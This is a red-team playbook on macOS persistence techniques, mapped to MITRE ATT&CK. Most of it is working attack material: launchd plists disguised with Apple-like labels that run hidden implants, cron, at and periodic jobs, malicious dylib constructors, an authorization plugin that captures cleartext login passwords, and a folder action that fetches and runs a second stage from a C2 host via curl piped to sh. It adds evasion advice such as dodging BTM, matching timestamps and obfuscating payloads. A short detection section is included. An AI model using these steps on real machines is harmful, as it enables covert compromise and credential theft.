# macOS Persistence Mechanisms

> **MITRE ATT&CK Mapping**: T1543.004 (Launch Daemon), T1543.001 (Launch Agent), T1547.011 (Plist Modification), T1547.015 (Login Items), T1546.014 (Emond), T1574.004 (Dylib Hijacking), T1053.003 (Cron), T1546.002 (Folder Actions)
> **Tactic**: Persistence (TA0003), Privilege Escalation (TA0004)
> **Platforms**: macOS
> **Required Permissions**: Varies -- User for LaunchAgents, Root for LaunchDaemons and most system-level mechanisms
> **OPSEC Risk**: Medium to High (many locations are actively monitored by modern EDR and BTM)

---

## Strategic Overview

macOS persistence is a critical post-exploitation objective that enables an operator to maintain access across reboots, user logouts, and system updates. Unlike Windows, where persistence mechanisms center on the registry and scheduled tasks, macOS relies heavily on the launchd subsystem, property list (plist) files, and Apple-specific frameworks such as XPC and Authorization Plugins. The launchd process (PID 1) is the primary initialization framework, managing both user-level LaunchAgents and system-level LaunchDaemons through XML-based plist configuration files.

The macOS persistence landscape has evolved significantly with each major release. Apple introduced Background Task Management (BTM) in macOS Ventura (13.0), which provides users and administrators with visibility into LaunchAgents, LaunchDaemons, and Login Items. As of macOS Sequoia (15.x) and beyond, operators must account for BTM notifications that alert users when new persistent items are installed. System Integrity Protection (SIP), the Endpoint Security (ES) framework, and Gatekeeper add further constraints. Traditional drop-a-plist approaches now carry significantly higher detection risk.

A sophisticated operator will layer multiple persistence mechanisms, vary their footprint across user-level and system-level locations, and select techniques appropriate to the operational context. Low-privilege persistence (LaunchAgents, Login Items, Folder Actions) suits initial footholds, while privileged persistence (LaunchDaemons, Authorization Plugins) provides resilience against user-level remediation. The choice of mechanism should be informed by the operational timeline, the target security posture, and the acceptable level of OPSEC risk.

---

## Technical Deep-Dive

### 1. LaunchAgents (User and Global)

LaunchAgents are the most common and well-understood persistence mechanism on macOS. They execute in the context of a user session and are managed by the per-user launchd process.

**Plist Locations:**

| Path | Scope | Permissions Required |
|------|-------|---------------------|
| `~/Library/LaunchAgents/` | Current user only | User |
| `/Library/LaunchAgents/` | All users on login | Admin/Root |
| `/System/Library/LaunchAgents/` | Apple system agents | SIP-protected (read-only) |

**Standard Plist Structure:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.security.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/Shared/.hidden/implant</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
```

**Key Plist Properties:**

| Key | Type | Description |
|-----|------|-------------|
| `Label` | String | Unique identifier (reverse DNS convention recommended) |
| `ProgramArguments` | Array | Executable path and arguments |
| `Program` | String | Alternative to ProgramArguments for simple executables |
| `RunAtLoad` | Boolean | Execute immediately when the agent is loaded |
| `KeepAlive` | Boolean/Dict | Restart the process if it exits |
| `StartInterval` | Integer | Execute every N seconds |
| `StartCalendarInterval` | Dict | Cron-like scheduling (Minute, Hour, Day, Weekday, Month) |
| `WatchPaths` | Array | Execute when specified file paths are modified |
| `QueueDirectories` | Array | Execute when items appear in specified directories |
| `EnvironmentVariables` | Dict | Environment variables to set before execution |
| `LimitLoadToSessionType` | String | Restrict to Aqua (GUI), Background, or LoginWindow |
| `ThrottleInterval` | Integer | Minimum seconds between launches (default: 10) |
| `ProcessType` | String | Background, Standard, Adaptive, Interactive |

**Loading and Management Commands:**

```bash
# Modern bootstrap method (macOS 10.10+)
launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.apple.security.updater.plist
launchctl bootout gui/$(id -u)/com.apple.security.updater

# Legacy load/unload (still functional)
launchctl load ~/Library/LaunchAgents/com.apple.security.updater.plist
launchctl unload ~/Library/LaunchAgents/com.apple.security.updater.plist

# Enable/disable without removing plist
launchctl enable gui/$(id -u)/com.apple.security.updater
launchctl disable gui/$(id -u)/com.apple.security.updater

# Force immediate execution
launchctl kickstart -k gui/$(id -u)/com.apple.security.updater

# Check status
launchctl list | grep com.apple.security.updater
launchctl print gui/$(id -u)/com.apple.security.updater
```

**OPSEC Notes for LaunchAgents:**
- Use Apple-like naming: `com.apple.security.*`, `com.apple.metadata.*`, `com.google.keystone.*`
- Place payload binary in a path consistent with the plist label
- Set file permissions to 644 (plist) and 755 (binary)
- Avoid `KeepAlive` if the implant handles its own lifecycle management
- Use `ProcessType: Background` to prevent dock icon appearance
- BTM in macOS 13+ WILL notify users of new agent registration
- Set `StandardOutPath` and `StandardErrorPath` to `/dev/null` to avoid log artifacts

### 2. LaunchDaemons (Root-Level)

LaunchDaemons run as root and execute before any user logs in. They provide the highest-privilege persistence via launchd without kernel involvement.

**Key Differences from LaunchAgents:**

| Property | LaunchAgent | LaunchDaemon |
|----------|-------------|--------------|
| Execution context | User session | System-wide (root) |
| Runs before login | No | Yes |
| GUI access | Yes | No (no WindowServer) |
| Install location | ~/Library or /Library (LaunchAgents) | /Library/LaunchDaemons |
| Typical use | Per-user applications | System services |

**Daemon Plist Example:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemstats.analysis</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Library/Application Support/.systemstats/daemon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>UserName</key>
    <string>root</string>
    <key>GroupName</key>
    <string>wheel</string>
</dict>
</plist>
```

**LaunchDaemon Loading:**

```bash
# Bootstrap into the system domain (requires root)
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.systemstats.analysis.plist

# Legacy load
sudo launchctl load /Library/LaunchDaemons/com.apple.systemstats.analysis.plist

# Verify
sudo launchctl list | grep com.apple.systemstats.analysis
sudo launchctl print system/com.apple.systemstats.analysis
```

**LaunchDaemon Hijacking:**

Rather than creating new plists (which triggers BTM and file monitoring), hijack existing daemons that reference binaries in writable locations or binaries that are missing:

```bash
# Find LaunchDaemons pointing to non-existent binaries
for plist in /Library/LaunchDaemons/*.plist; do
    prog=$(defaults read "$plist" Program 2>/dev/null || \
           /usr/libexec/PlistBuddy -c "Print :ProgramArguments:0" "$plist" 2>/dev/null)
    if [ -n "$prog" ] && [ ! -f "$prog" ]; then
        echo "MISSING: $plist -> $prog"
    fi
done

# Find LaunchDaemons with writable binary directories
for plist in /Library/LaunchDaemons/*.plist; do
    prog=$(/usr/libexec/PlistBuddy -c "Print :ProgramArguments:0" "$plist" 2>/dev/null)
    if [ -n "$prog" ]; then
        dir=$(dirname "$prog")
        [ -w "$dir" ] && echo "WRITABLE: $plist -> $prog (dir: $dir)"
    fi
done
```

This technique does not create or modify plist files, bypassing detection rules focused on file creation in LaunchDaemon directories.

### 3. Login Items

Login Items execute when a user logs in and appear in System Settings > General > Login Items.

**Installation Methods:**

```bash
# AppleScript-based registration
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Applications/Updater.app", hidden:true}'

# List current login items
osascript -e 'tell application "System Events" to get the name of every login item'

# Remove login item
osascript -e 'tell application "System Events" to delete login item "Updater"'
```

**SMLoginItemSetEnabled API (Swift/Objective-C):**
```swift
import ServiceManagement
SMLoginItemSetEnabled("com.example.helper" as CFString, true)

// macOS 13+ API
let service = SMAppService.loginItem(identifier: "com.example.helper")
try service.register()
```

**Login Items Storage:**
```
~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm
~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems_v2.btm  # macOS 14+
```

### 4. Cron Jobs

While Apple has deprecated cron in favor of launchd, the cron daemon is still present and functional.

```bash
# Edit crontab for current user
crontab -e

# Install crontab non-interactively
echo "*/30 * * * * /Users/Shared/.hidden/implant >/dev/null 2>&1" | crontab -

# Append to existing crontab
(crontab -l 2>/dev/null; echo "*/30 * * * * /Users/Shared/.hidden/implant >/dev/null 2>&1") | crontab -

# List crontab
crontab -l

# Crontab storage locations
/usr/lib/cron/tabs/<username>    # Per-user crontabs
/etc/crontab                      # System crontab
```

**macOS-Specific Considerations:**
- Cron jobs may trigger TCC prompts for accessing protected directories
- The cron daemon runs as root but jobs execute as the owning user
- Less commonly monitored than LaunchAgents/Daemons by many EDR solutions
- On macOS 13+, crontab modifications may trigger BTM notifications

### 5. Dylib Hijacking

Dylib hijacking exploits the macOS dynamic linker (dyld) search order to load malicious code into legitimate application processes. This is analogous to DLL hijacking on Windows.

**a) DYLD_INSERT_LIBRARIES:**

```bash
# Basic injection (blocked for hardened/SIP-protected binaries)
DYLD_INSERT_LIBRARIES=/tmp/malicious.dylib /Applications/Target.app/Contents/MacOS/Target

# LaunchAgent with environment variable injection
cat > ~/Library/LaunchAgents/com.app.helper.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.app.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/VulnerableApp.app/Contents/MacOS/VulnerableApp</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>DYLD_INSERT_LIBRARIES</key>
        <string>/Users/Shared/.lib/payload.dylib</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
```

**Restrictions on DYLD_INSERT_LIBRARIES:**
- SIP prevents injection into Apple-signed system binaries
- Hardened Runtime blocks injection (unless `com.apple.security.cs.allow-dyld-environment-variables` is present)
- Library Validation prevents loading differently-signed dylibs
- setuid/setgid binaries strip DYLD_ environment variables
- Restricted (`__RESTRICT,__restrict`) segment blocks injection

**b) @rpath Abuse:**

```bash
# Discover rpath search order
otool -l /Applications/Target.app/Contents/MacOS/Target | grep -A2 LC_RPATH

# Find dylibs loaded via @rpath
otool -L /Applications/Target.app/Contents/MacOS/Target | grep @rpath

# Find binaries with weak dylib references (optional loads that don't crash if missing)
otool -l /path/to/binary | grep -A3 LC_LOAD_WEAK_DYLIB

# Scan applications for missing rpath dylibs
for app in /Applications/*.app; do
    binary="$app/Contents/MacOS/$(defaults read "$app/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
    if [ -f "$binary" ]; then
        otool -L "$binary" 2>/dev/null | grep -i "not found" && echo "  -> $binary"
    fi
done
```

**c) LC_LOAD_DYLIB Manipulation:**

```bash
# Add a new load command
install_name_tool -add_rpath /tmp/evil /path/to/binary

# Change an existing dylib reference
install_name_tool -change /old/path/lib.dylib /new/path/evil.dylib /path/to/binary

# Insert a dylib load command
insert_dylib --strip-codesig --all-yes /tmp/evil.dylib /path/to/binary

# Verify modification
otool -L /path/to/binary
```

**Minimal Hijack Dylib:**

```c
// evil.dylib - constructor runs when loaded
#include <stdlib.h>

__attribute__((constructor))
void initializer(void) {
    system("/Users/Shared/.hidden/implant &");
}
```

```bash
# Compile
gcc -dynamiclib -o evil.dylib evil.c

# Proxy dylib (preserves original functionality via re-export)
gcc -dynamiclib -o evil.dylib evil.c -Wl,-reexport_library,/path/to/original.dylib

# Ad-hoc sign
codesign -fs - evil.dylib
```

### 6. Folder Actions

Folder Actions attach scripts to directories, executing when items are added, removed, or when the folder window is opened or closed.

**JXA Folder Action Payload:**

```javascript
// update_helper.js
// Compile: osacompile -l JavaScript -o update_helper.scpt update_helper.js
function adding_items_to(folderPath, addedItems) {
    var app = Application.currentApplication();
    app.includeStandardAdditions = true;
    app.doShellScript("/Users/Shared/.hidden/implant &>/dev/null &");
}

function opening_folder(folderPath) {
    var app = Application.currentApplication();
    app.includeStandardAdditions = true;
    app.doShellScript("curl -s https://c2.example.com/stage2 | sh &>/dev/null &");
}
```

**Programmatic Registration:**

```bash
# Enable folder actions globally
defaults write com.apple.FolderActionsDispatcher folderActionsEnabled -bool true

# Compile the JXA script
osacompile -l JavaScript -o ~/Library/Scripts/Folder\ Action\ Scripts/update_helper.scpt /tmp/update_helper.js

# Attach via AppleScript
osascript -e '
tell application "System Events"
    set folder actions enabled to true
    make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder as text)}
    tell folder action "Downloads"
        make new script at end of scripts with properties {name:"update_helper.scpt"}
    end tell
end tell'
```

**Configuration Locations:**
```
~/Library/Scripts/Folder Action Scripts/
/Library/Scripts/Folder Action Scripts/
~/Library/Preferences/com.apple.FolderActionsDispatcher.plist
```

Alternatively, use an Automator workflow to wrap JXA, executed via `/usr/bin/automator /path/to/Workflow.wflow` to avoid direct osascript detection.

### 7. Authorization Plugins

Authorization plugins execute during the login window authentication process. They run with root privileges via the Security Agent and can capture cleartext credentials.

**Plugin Installation (requires root):**

```bash
# Create plugin bundle structure
mkdir -p /Library/Security/SecurityAgentPlugins/UpdateHelper.bundle/Contents/MacOS

# Copy compiled plugin binary
cp /path/to/plugin /Library/Security/SecurityAgentPlugins/UpdateHelper.bundle/Contents/MacOS/UpdateHelper

# Create Info.plist for the bundle
cat > /Library/Security/SecurityAgentPlugins/UpdateHelper.bundle/Contents/Info.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.apple.security.UpdateHelper</string>
    <key>CFBundleExecutable</key>
    <string>UpdateHelper</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
</dict>
</plist>
EOF
```

**Authorization Database Modification:**

```bash
# Read current login console configuration
security authorizationdb read system.login.console > /tmp/auth.plist

# The mechanisms array controls authentication flow:
# builtin:prelogin
# builtin:policy-banner
# loginwindow:login
# builtin:login-begin
# builtin:authenticate,privileged    <-- password validated here
# UpdateHelper:invoke,privileged     <-- INSERT after auth (captures cleartext password)
# builtin:login-success
# loginwindow:done

# Add plugin mechanism after builtin:authenticate,privileged
/usr/libexec/PlistBuddy -c "Add :mechanisms:5 string 'UpdateHelper:invoke,privileged'" /tmp/auth.plist

# Write modified configuration back
security authorizationdb write system.login.console < /tmp/auth.plist
```

**Context Values Available to Plugins:**
- `kAuthorizationEnvironmentUsername` - Login username (plaintext)
- `kAuthorizationEnvironmentPassword` - Validated cleartext password
- `uid` - User ID
- `home` - Home directory path

### 8. XPC Service Abuse

XPC services provide inter-process communication and can be registered for persistence.

```bash
# XPC services in application bundles
/Applications/App.app/Contents/XPCServices/Helper.xpc/

# Privileged helper tools (installed via SMJobBless)
/Library/PrivilegedHelperTools/

# Discover registered XPC services
launchctl list | grep -i xpc
find /Applications -name "*.xpc" -type d 2>/dev/null
```

**NSXPCConnection Usage:**

```swift
// Connect to an XPC service
let connection = NSXPCConnection(machServiceName: "com.vulnerable.helper")
connection.remoteObjectInterface = NSXPCInterface(with: HelperProtocol.self)
connection.resume()

let proxy = connection.remoteObjectProxyWithErrorHandler { error in
    print("Error: \(error)")
} as! HelperProtocol
proxy.runCommand("/bin/bash", arguments: ["-c", "/tmp/implant &"])
```

### 9. Configuration Profiles (.mobileconfig)

Configuration profiles can enforce settings and install certificates. Since macOS 11, profiles cannot be installed silently via CLI.

```bash
# Install requires user interaction (System Settings approval)
open /path/to/profile.mobileconfig

# List installed profiles
profiles list
sudo profiles list -all

# Remove a profile
sudo profiles remove -identifier com.corporate.security

# Check MDM enrollment (MDM can push profiles silently)
profiles status -type enrollment

# Profile storage: /var/db/ConfigurationProfiles/
```

MDM-enrolled devices can receive profiles pushed from the MDM server without user interaction, enabling certificate installation (for MITM), VPN settings, managed preferences, and web clip deployment.

### 10. Periodic Scripts

macOS periodic scripts run at daily, weekly, and monthly intervals as root.

```bash
# Script directories (root required to modify)
/etc/periodic/daily/      # Runs daily ~3:15 AM
/etc/periodic/weekly/     # Runs weekly Saturday ~3:15 AM
/etc/periodic/monthly/    # Runs monthly 1st ~5:30 AM

# Create persistence script
sudo tee /etc/periodic/daily/999.update-check > /dev/null << 'EOF'
#!/bin/sh
/Library/Application\ Support/.system/callback >/dev/null 2>&1
EOF
sudo chmod 755 /etc/periodic/daily/999.update-check

# Test execution
sudo periodic daily

# Triggered by LaunchDaemons:
# /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
# /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist
# /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
```

### 11. Emond (Event Monitor Daemon)

Emond processes events through rules in plist files and runs as root.

```bash
# Critical prerequisite: emond requires a file in QueueDirectories
sudo touch /private/var/db/emondClients/init

# Create rule plist
sudo tee /etc/emond.d/rules/update_rule.plist > /dev/null << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
    <dict>
        <key>name</key>
        <string>system_update</string>
        <key>enabled</key>
        <true/>
        <key>eventTypes</key>
        <array>
            <string>startup</string>
        </array>
        <key>actions</key>
        <array>
            <dict>
                <key>command</key>
                <string>/Library/Application Support/.system/callback</string>
                <key>user</key>
                <string>root</string>
                <key>type</key>
                <string>RunCommand</string>
            </dict>
        </array>
    </dict>
</array>
</plist>
EOF
```

**Event Types:** startup, authentication (user login), periodic timers
**Action Types:** RunCommand, SendEmail, SendSMS, Log

**Important:** Emond was removed in macOS Ventura (13.0) and later. It remains viable only on macOS Monterey (12.x) and earlier.

### 12. At Jobs

The `at` command schedules one-time command execution.

```bash
# Enable atrun daemon (disabled by default)
sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist

# Schedule execution
echo "/Users/Shared/.hidden/implant" | at now + 5 minutes
echo "/Users/Shared/.hidden/implant" | at 0300 tomorrow

# Self-rescheduling for pseudo-persistence
echo '/Users/Shared/.hidden/implant; echo "/Users/Shared/.hidden/implant" | at now + 30 minutes' | at now + 30 minutes

# List and manage jobs
atq
at -c <job_number>
atrm <job_number>

# Storage: /private/var/at/jobs/
```

---

## 2025 Techniques

### Background Task Management (BTM) Evasion

macOS Ventura (13.0) introduced BTM, which notifies users when new persistent items are installed. In macOS Sequoia 15.x (widely deployed 2025), BTM monitoring has expanded further.

**BTM Evasion Approaches:**

1. **LaunchDaemon Hijacking** -- Modify existing daemon binaries rather than creating new plists. No BTM notification since the plist already exists.
2. **Non-BTM-Monitored Vectors** -- Folder Actions, emond rules, periodic scripts, and authorization plugins are NOT monitored by BTM.
3. **Existing Plist Modification** -- Modify an existing disabled agent ProgramArguments rather than creating new plists.

```bash
# Query BTM database
sfltool dumpbtm

# BTM database location
/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v*.btm
```

### CVE-2024-44243: SIP Bypass via StorageKit (Disclosed January 2025)

Microsoft Threat Intelligence disclosed a SIP bypass through the storagekitd daemon. The daemon has `com.apple.rootless.install.inheritable` entitlement, allowing child processes to bypass SIP. Attackers could load malicious kernel extensions through storagekitd, achieving persistence in SIP-protected locations. Patched in macOS 15.2 (December 2024).

### Dylib Proxy Persistence (2025 Refinement)

Modern dylib hijacking uses proxy dylibs that re-export the original library symbols while adding malicious functionality:

```c
// proxy.c - loads original dylib and executes payload
#include <dlfcn.h>
#include <stdlib.h>

__attribute__((constructor))
void proxy_init(void) {
    dlopen("/path/to/original/legitimate.dylib", RTLD_NOW);
    system("/Users/Shared/.hidden/implant &>/dev/null &");
}
```

```bash
gcc -dynamiclib -o proxy.dylib proxy.c -Wl,-reexport_library,/path/to/original.dylib
codesign -fs - proxy.dylib
```

### Electron App Persistence (2025)

Many macOS applications use Electron. Operators can modify app JavaScript resources or abuse the `ELECTRON_RUN_AS_NODE` environment variable:

```bash
# Extract, modify, and repack Electron app resources
npx asar extract /Applications/Target.app/Contents/Resources/app.asar /tmp/app
# Add payload to main.js or preload scripts
npx asar pack /tmp/app /Applications/Target.app/Contents/Resources/app.asar
```

### JXA-Based Persistence (PersistentJXA Toolkit)

Compiled JXA scripts avoid command-line osascript detection:

```javascript
ObjC.import('Foundation');
var plist = {
    Label: "com.apple.mdworker.shared",
    ProgramArguments: ["/bin/sh", "-c", "/Users/Shared/.cache/worker"],
    RunAtLoad: true,
    StartInterval: 7200
};
var data = $.NSPropertyListSerialization.dataWithPropertyListFormatOptionsError(
    $(plist), $.NSPropertyListXMLFormat_v1_0, 0, null
);
var path = $.NSString.alloc.initWithUTF8String(
    $.NSHomeDirectory().js + "/Library/LaunchAgents/com.apple.mdworker.shared.plist"
);
data.writeToFileAtomically(path, true);
```

### Login/Logout Hooks (Deprecated but Functional)

```bash
# Set login hook (runs as root at user login)
sudo defaults write com.apple.loginwindow LoginHook /path/to/script

# Set logout hook
sudo defaults write com.apple.loginwindow LogoutHook /path/to/script

# Verify
defaults read com.apple.loginwindow LoginHook 2>/dev/null
```

---

## Detection & Defense

### Detection Strategies

| Mechanism | Detection Method | Log Source |
|-----------|-----------------|------------|
| LaunchAgents/Daemons | File monitoring, BTM, `launchctl list` | ES framework, Unified Log |
| Login Items | BTM notifications, `sfltool dumpbtm` | BTM database |
| Cron | `crontab -l`, file monitoring in `/usr/lib/cron/tabs/` | File events |
| Dylib Hijacking | Code signature validation, DYLD_ env monitoring | ES process events |
| Folder Actions | FolderActionsDispatcher.plist monitoring | File events |
| Auth Plugins | SecurityAgentPlugins dir monitoring, authdb auditing | ES, Unified Log |
| Emond | File monitoring in `/etc/emond.d/rules/` | File events |
| Periodic | File monitoring in `/etc/periodic/` | File events |
| Profiles | `profiles list`, MDM enrollment status | Configuration profiles log |

### Key Detection Commands

```bash
# List all LaunchAgents/Daemons
launchctl list
sudo launchctl list

# Check BTM database
sfltool dumpbtm

# Audit authorization database
security authorizationdb read system.login.console | grep -A5 mechanisms

# Check folder actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Check crontabs
crontab -l
sudo ls -la /usr/lib/cron/tabs/

# Check emond rules (macOS 12 and earlier)
ls -la /etc/emond.d/rules/ 2>/dev/null

# Check periodic scripts
ls -la /etc/periodic/daily/ /etc/periodic/weekly/ /etc/periodic/monthly/

# Unified log queries
log show --predicate 'subsystem == "com.apple.xpc.launchd"' --last 1h
log show --predicate 'process == "backgroundtaskmanagementagent"' --last 1h
```

### Endpoint Security Framework Events

```
ES_EVENT_TYPE_NOTIFY_CREATE - File creation in persistence directories
ES_EVENT_TYPE_NOTIFY_WRITE  - File modification in persistence directories
ES_EVENT_TYPE_NOTIFY_EXEC   - Execution of newly created binaries
ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD - BTM item registration
```

### Hardening

- Enable SIP: `csrutil enable`
- Monitor persistence directories with the Endpoint Security framework
- Use KnockKnock (Objective-See) for regular persistence scans
- Review BTM notifications in System Settings > General > Login Items
- Audit the authorization database periodically
- Deploy MDM policies to restrict profile installation
- Enforce code signing requirements for all persistent items

---

## OPSEC Considerations

### Naming and Blending

```bash
# Good naming conventions (blend with legitimate software)
com.apple.security.cloudkeychainproxy3
com.google.keystone.agent
com.microsoft.autoupdate.helper

# Avoid obvious names
com.evil.backdoor
com.test.persistence
```

### Timestamp and Permission Matching

```bash
# Match timestamps to surrounding files
touch -r /Library/LaunchAgents/com.apple.something.plist /Library/LaunchAgents/your.plist

# Set proper ownership and permissions
chown root:wheel /Library/LaunchDaemons/your.plist
chmod 644 /Library/LaunchDaemons/your.plist
```

### Technique Selection Matrix

| Technique | OPSEC Risk | BTM Alert | Root Required | Survives Reboot |
|-----------|-----------|-----------|---------------|-----------------|
| User LaunchAgent | HIGH | YES | No | Yes |
| LaunchDaemon (new) | HIGH | YES | Yes | Yes |
| LaunchDaemon Hijack | LOW | No | Varies | Yes |
| Folder Actions | LOW | No | No | Yes |
| Authorization Plugin | MEDIUM | No | Yes | Yes |
| Periodic Scripts | LOW | No | Yes | Yes |
| Emond (macOS <13) | LOW | No | Yes | Yes |
| Cron | MEDIUM | Partial | No | Yes |
| Dylib Hijacking | LOW | No | Varies | Yes |
| Login Items | HIGH | YES | No | Yes |
| At Jobs | LOW | No | No | No (one-time) |
| Config Profiles | MEDIUM | No | Admin/MDM | Yes |

### General Guidance

1. Prefer mechanisms NOT monitored by BTM (Folder Actions, periodic, emond, auth plugins)
2. Use compiled payloads over scripts to avoid command-line argument logging
3. Implement redundant persistence at different privilege levels
4. Clean up artifacts: maintain a log of all persistence changes for reliable removal
5. Ad-hoc sign implant binaries to reduce unsigned binary alerts: `codesign -s - /path/to/implant`
6. Consider chaining: LaunchAgent triggers a compiled binary that loads a dylib
7. Encrypt or obfuscate payloads on disk; decrypt at runtime
8. Test all persistence mechanisms against the target EDR in a lab environment first
9. Use `StartCalendarInterval` instead of `RunAtLoad` to avoid immediate execution after install

---

## Cross-References

- [macOS Credential Access](../07-credential-access/macos-credential-access.md) - Credential harvesting post-persistence
- [macOS Privilege Escalation](../05-privilege-escalation/macos-privesc.md) - Escalating to root for system-level persistence

---

## References

- MITRE ATT&CK T1543.004 - Launch Daemon - https://attack.mitre.org/techniques/T1543/004/
- MITRE ATT&CK T1543.001 - Launch Agent - https://attack.mitre.org/techniques/T1543/001/
- MITRE ATT&CK T1547.015 - Login Items - https://attack.mitre.org/techniques/T1547/015/
- MITRE ATT&CK T1547.011 - Plist Modification - https://attack.mitre.org/techniques/T1547/011/
- MITRE ATT&CK T1546.014 - Emond - https://attack.mitre.org/techniques/T1546/014/
- MITRE ATT&CK T1574.004 - Dylib Hijacking - https://attack.mitre.org/techniques/T1574/004/
- MITRE ATT&CK T1546.002 - Folder Actions - https://attack.mitre.org/techniques/T1546/002/
- SentinelOne - How Malware Persists on macOS - https://www.sentinelone.com/blog/how-malware-persists-on-macos/
- theevilbit - Beyond the good ol' LaunchAgents (Full Series) - https://theevilbit.github.io/beyond/
- SpecterOps - Folder Actions for Persistence on macOS (Cody Thomas) - https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d
- SpecterOps - Persistent JXA (Leo Pitt) - https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5
- xorrior - Leveraging Emond on macOS For Persistence - https://www.xorrior.com/emond-persistence/
- xorrior - Persistent Credential Theft with Authorization Plugins - https://www.xorrior.com/persistent-credential-theft/
- bradleyjkemp - LaunchDaemon Hijacking - https://bradleyjkemp.dev/post/launchdaemon-hijacking/
- HackTricks - macOS Red Teaming - https://book.hacktricks.xyz/macos-hardening/macos-red-teaming
- HackTricks - macOS Dyld Hijacking and DYLD_INSERT_LIBRARIES - https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-dyld-hijacking-and-dyld_insert_libraries.html
- Atomic Red Team T1543.004 - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.004/T1543.004.md
- D00MFist/PersistentJXA - https://github.com/D00MFist/PersistentJXA
- cocomelonc - macOS injection techniques (2025) - https://cocomelonc.github.io/macos/2025/06/19/malware-mac-2.html
- 100 Days of Red Team - macOS dylib hijacking - https://www.100daysofredteam.com/p/what-is-dylib-hijacking-in-macos
- BallisKit - macOS DYLIB Injection at Scale - https://blog.balliskit.com/macos-dylib-injection-at-scale-designing-a-self-sufficient-loader-da8799a56ada
- Microsoft Security Blog - CVE-2024-44243 SIP Bypass (Jan 2025) - https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/
- Red Dog Security - Understanding MacOS Malware Persistence - https://reddogsecurity.substack.com/p/understanding-macos-malware-persistence
- Apple Developer - Extending Authorization Services with Plug-ins - https://developer.apple.com/documentation/security/extending-authorization-services-with-plug-ins
